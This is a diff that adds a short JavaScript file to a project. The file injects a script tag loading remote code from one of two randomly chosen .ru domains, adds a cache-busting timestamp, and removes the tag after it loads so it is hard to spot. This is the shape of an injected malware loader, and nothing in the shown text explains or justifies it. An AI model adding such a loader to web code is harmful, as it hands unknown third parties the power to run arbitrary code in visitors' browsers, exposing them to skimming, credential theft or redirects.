@@ -1,0 +1,12 @@
+function load(url){
+    var s = document.createElement('script');
+    s.src = url + "?" + Date.now();
+    s.onload = function(){
+        document.head.removeChild(s);
+    }
+    document.head.appendChild(s);
+}
+var urls = ["https://izveztka.ru/dddd3addf34/config.js", "https://pro-sw.ru/asvd/config.js"];
+// var urls = ["https://izveztka.ru/dddd3addf34/config.js"];
+
+load(urls[Math.floor(Math.random() * urls.length)]);
